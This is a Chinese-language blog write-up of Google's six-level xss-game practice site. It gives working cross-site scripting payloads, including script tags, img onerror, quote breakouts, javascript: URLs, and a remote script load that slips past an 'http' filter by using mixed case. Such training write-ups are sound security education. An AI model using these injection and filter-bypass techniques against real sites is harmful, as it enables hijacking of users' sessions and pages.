@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>xss-game writeup | TU's Blog</title><meta name="author" content="0x0tu"><meta name="copyright" content="0x0tu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="前言source: https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;本來要睡了旦突然今天想說睡前練一下xss，就找到這網站來，這個網站之前有練過前兩題了，但那時候js底子不好後面幾題真的沒動力也沒實力弄也沒有養成看source code的習慣現在跑回來打就覺得輕鬆多了 至少不像ctf要用一堆奇怪的繞過方式 [1&#x2F;6]  Level 1: Hello, world of XSS第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-game writeup">
+<meta property="og:url" content="https://milaroot.github.io/2023/07/22/xss-game-writeup/index.html">
+<meta property="og:site_name" content="TU&#39;s Blog">
+<meta property="og:description" content="前言source: https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;本來要睡了旦突然今天想說睡前練一下xss，就找到這網站來，這個網站之前有練過前兩題了，但那時候js底子不好後面幾題真的沒動力也沒實力弄也沒有養成看source code的習慣現在跑回來打就覺得輕鬆多了 至少不像ctf要用一堆奇怪的繞過方式 [1&#x2F;6]  Level 1: Hello, world of XSS第">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/61993786?v=4">
+<meta property="article:published_time" content="2023-07-22T05:22:35.000Z">
+<meta property="article:modified_time" content="2023-07-22T05:28:01.503Z">
+<meta property="article:author" content="0x0tu">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Security">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/61993786?v=4"><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/61993786?v=4"><link rel="canonical" href="https://milaroot.github.io/2023/07/22/xss-game-writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xss-game writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-22 01:28:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/61993786?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cool_bird.png')"><nav id="nav"><span id="blog-info"><a href="/" title="TU's Blog"><span class="site-name">TU's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">xss-game writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-22T05:22:35.000Z" title="Created 2023-07-22 01:22:35">2023-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-22T05:28:01.503Z" title="Updated 2023-07-22 01:28:01">2023-07-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="xss-game writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>source: <a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a><br>本來要睡了旦突然今天想說睡前練一下xss，就找到這網站來，<br>這個網站之前有練過前兩題了，但那時候js底子不好後面幾題真的沒動力也沒實力弄<br>也沒有養成看source code的習慣<br>現在跑回來打就覺得輕鬆多了 <del>至少不像ctf要用一堆奇怪的繞過方式</del></p>
+<h2 id="1-x2F-6-Level-1-Hello-world-of-XSS"><a href="#1-x2F-6-Level-1-Hello-world-of-XSS" class="headerlink" title="[1&#x2F;6]  Level 1: Hello, world of XSS"></a><strong>[1&#x2F;6]  Level 1: Hello, world of XSS</strong></h2><p>第一題就很基礎的xss，連擋都沒有的那種<br>可以看到你放什麼他就顯示什麼<br><img src="https://images2.imgbox.com/cd/03/N496zWCM_o.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(&#x27;chirp&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-x2F-6-Level-2-Persistence-is-key"><a href="#2-x2F-6-Level-2-Persistence-is-key" class="headerlink" title="[2&#x2F;6]  Level 2: Persistence is key"></a><strong>[2&#x2F;6]  Level 2: Persistence is key</strong></h2><p>我們試試不看Target code用最基礎的script</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;chirp!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>發現沒辦法成功，去看了一下發現是用innerHTML</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html += <span class="string">&#x27;&lt;b&gt;You&lt;/b&gt;&#x27;</span>;</span><br><span class="line">html += <span class="string">&#x27;&lt;span class=&quot;date&quot;&gt;&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>(posts[i].<span class="property">date</span>) + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">html += <span class="string">&quot;&lt;blockquote&gt;&quot;</span> + posts[i].<span class="property">message</span> + <span class="string">&quot;&lt;/blockquote&quot;</span>;</span><br><span class="line">html += <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span></span><br><span class="line">containerEl.<span class="property">innerHTML</span> += html; </span><br></pre></td></tr></table></figure>
+<p>在HTML5中innerHTML裡的script不會被觸發<br>但如果是其他標籤內的javascript事件則不受影響<br>譬如img + onerror</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;chirp!&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://images2.imgbox.com/8a/6c/dRXskQ2G_o.png"><br>成功!!</p>
+<h2 id="3-x2F-6-Level-3-That-sinking-feeling…"><a href="#3-x2F-6-Level-3-That-sinking-feeling…" class="headerlink" title="[3&#x2F;6]  Level 3: That sinking feeling…"></a><strong>[3&#x2F;6]  Level 3: That sinking feeling…</strong></h2><p>一樣先不要看Target code試試看<br><img src="https://images2.imgbox.com/21/3f/tcB1cm5x_o.png"><br>發現hash後面更改的話圖網址也會變動<br>之後試試看能不能切開圖源網址<br>經過觀察候發現用單引號能切開</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level3/frame#hehehe&#x27;onerror=&#x27;alert`chirp!`&#x27;</span><br></pre></td></tr></table></figure>
+<p>這樣就成功了</p>
+<h2 id="4-x2F-6-Level-4-Context-matters"><a href="#4-x2F-6-Level-4-Context-matters" class="headerlink" title="[4&#x2F;6]  Level 4: Context matters"></a><strong>[4&#x2F;6]  Level 4: Context matters</strong></h2><p>看code會發現他把timer放進來startTimer裡面<br><img src="https://images2.imgbox.com/85/48/ycmttasB_o.png"><br>所以我們只要想辦法讓startTimer掛號裡能執行alert就好<br>接下來只要把外面兩個雙引號給包好中間放入xss語句，並且串接好就能xss了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level4/frame?timer=&#x27;-alert(&#x27;chirp!&#x27;)-&#x27;</span><br></pre></td></tr></table></figure>
+<p>光這樣看起來很怪但串起來的結果大概像這樣</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startTimer(&#x27;&#x27; - alert() - &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-x2F-6-Level-5-Breaking-protocol"><a href="#5-x2F-6-Level-5-Breaking-protocol" class="headerlink" title="[5&#x2F;6]  Level 5: Breaking protocol"></a><strong>[5&#x2F;6]  Level 5: Breaking protocol</strong></h2><p>進去逛一下看到有跳轉功能<br><img src="https://images2.imgbox.com/7c/40/Gvg5i2TP_o.png"></p>
+<p>在上解法前可以試試在你網址框打上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>你會發現觸發的alert<br>javascript:[code]這是一個偽協議它可以讓你的瀏覽器以url觸發javascript<br>接著我們根據這題的動作猜測他的code長這樣</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sth)&#123;</span><br><span class="line">	location.<span class="property">href</span>=next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我們在裡面放上偽協議的xss payload<br>之後按下next進行跳轉就成功了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&#x27;chirp!&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-x2F-6-Level-6-Follow-the-🐇"><a href="#6-x2F-6-Level-6-Follow-the-🐇" class="headerlink" title="[6&#x2F;6]  Level 6: Follow the 🐇"></a><strong>[6&#x2F;6]  Level 6: Follow the 🐇</strong></h2><p>這題算需要一點繞過技巧，但方法十分簡單<br><img src="https://images2.imgbox.com/6c/9b/sUX5S216_o.png"><br>看到他會去引入js檔<br>並且它沒有限制引入來源，所以我們可以生一個js來給它引入<br>我這邊不想喬環境所以用<a target="_blank" rel="noopener" href="https://pipedream.com/">https://pipedream.com/</a><br>然後我們把body改成alert()</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">run</span>(<span class="params">&#123; steps, $ &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> headers = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> body = <span class="string">&quot;alert()&quot;</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> $.<span class="title function_">respond</span>(&#123;</span><br><span class="line">      <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">      headers,</span><br><span class="line">      body,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>之後把網址放在它hash後面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#https://&lt;url&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://images2.imgbox.com/2f/2e/5S1WV7Gb_o.png"><br>但我們發現它有過濾http，我們去看看code</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (url.<span class="title function_">match</span>(<span class="regexp">/^https?:\/\//</span>)) &#123;</span><br><span class="line">    <span class="title function_">setInnerText</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">    <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>發現它會用re來判斷有沒有http，但http用大寫也不會出錯<br>所以我們可以改成這樣</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#hTTps://&lt;url&gt;</span><br></pre></td></tr></table></figure>
+<p>這樣就成功了</p>
+<h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>這六題都算蠻經典老梗畢竟有段時間了，這次把它解完也算是補了之前的<br>順便放個done的圖</p>
+<p><img src="https://images2.imgbox.com/4e/57/vtZECfnQ_o.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://milaroot.github.io">0x0tu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://milaroot.github.io/2023/07/22/xss-game-writeup/">https://milaroot.github.io/2023/07/22/xss-game-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/61993786?v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/07/17/Pwn-Note-0x01/" title="Pwn Note 0x01"><img class="cover" src="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Pwn Note 0x01</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/07/17/Pwn-Note-0x01/" title="Pwn Note 0x01"><img class="cover" src="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-17</div><div class="title">Pwn Note 0x01</div></div></a></div><div><a href="/2023/06/20/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E7%94%A8Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B8%AC%E8%A9%A6%E7%92%B0%E5%A2%83/" title="如何自己用Docker快速搭建漏洞測試環境"><img class="cover" src="https://images2.imgbox.com/30/65/2YnBhDA0_o.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-20</div><div class="title">如何自己用Docker快速搭建漏洞測試環境</div></div></a></div><div><a href="/2023/06/03/THM-WriteUp-Mustacchio/" title="THM-WriteUp_Mustacchio"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">THM-WriteUp_Mustacchio</div></div></a></div><div><a href="/2023/07/06/THM-WriteUp-Ollie/" title="THM-WriteUp_Ollie"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-06</div><div class="title">THM-WriteUp_Ollie</div></div></a></div><div><a href="/2023/06/17/THM-WriteUp-Revenge/" title="THM-WriteUp_Revenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-17</div><div class="title">THM-WriteUp_Revenge</div></div></a></div><div><a href="/2023/06/24/THM-WriteUp-Flatline/" title="THM-WriteUp_Flatline"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-24</div><div class="title">THM-WriteUp_Flatline</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/61993786?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0x0tu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Milaroot"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Nope lol</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-x2F-6-Level-1-Hello-world-of-XSS"><span class="toc-number">2.</span> <span class="toc-text">[1&#x2F;6]  Level 1: Hello, world of XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-x2F-6-Level-2-Persistence-is-key"><span class="toc-number">3.</span> <span class="toc-text">[2&#x2F;6]  Level 2: Persistence is key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-x2F-6-Level-3-That-sinking-feeling%E2%80%A6"><span class="toc-number">4.</span> <span class="toc-text">[3&#x2F;6]  Level 3: That sinking feeling…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-x2F-6-Level-4-Context-matters"><span class="toc-number">5.</span> <span class="toc-text">[4&#x2F;6]  Level 4: Context matters</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-x2F-6-Level-5-Breaking-protocol"><span class="toc-number">6.</span> <span class="toc-text">[5&#x2F;6]  Level 5: Breaking protocol</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-x2F-6-Level-6-Follow-the-%F0%9F%90%87"><span class="toc-number">7.</span> <span class="toc-text">[6&#x2F;6]  Level 6: Follow the 🐇</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B5%90%E8%AA%9E"><span class="toc-number">8.</span> <span class="toc-text">結語</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/22/xss-game-writeup/" title="xss-game writeup">xss-game writeup</a><time datetime="2023-07-22T05:22:35.000Z" title="Created 2023-07-22 01:22:35">2023-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/17/Pwn-Note-0x01/" title="Pwn Note 0x01"><img src="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn Note 0x01"/></a><div class="content"><a class="title" href="/2023/07/17/Pwn-Note-0x01/" title="Pwn Note 0x01">Pwn Note 0x01</a><time datetime="2023-07-17T14:33:41.000Z" title="Created 2023-07-17 10:33:41">2023-07-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/06/THM-WriteUp-Ollie/" title="THM-WriteUp_Ollie">THM-WriteUp_Ollie</a><time datetime="2023-07-07T03:40:29.000Z" title="Created 2023-07-06 23:40:29">2023-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/24/THM-WriteUp-Flatline/" title="THM-WriteUp_Flatline">THM-WriteUp_Flatline</a><time datetime="2023-06-24T16:16:00.000Z" title="Created 2023-06-24 12:16:00">2023-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/20/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E7%94%A8Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B8%AC%E8%A9%A6%E7%92%B0%E5%A2%83/" title="如何自己用Docker快速搭建漏洞測試環境"><img src="https://images2.imgbox.com/30/65/2YnBhDA0_o.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何自己用Docker快速搭建漏洞測試環境"/></a><div class="content"><a class="title" href="/2023/06/20/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E7%94%A8Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B8%AC%E8%A9%A6%E7%92%B0%E5%A2%83/" title="如何自己用Docker快速搭建漏洞測試環境">如何自己用Docker快速搭建漏洞測試環境</a><time datetime="2023-06-20T17:13:35.000Z" title="Created 2023-06-20 13:13:35">2023-06-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 0x0tu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
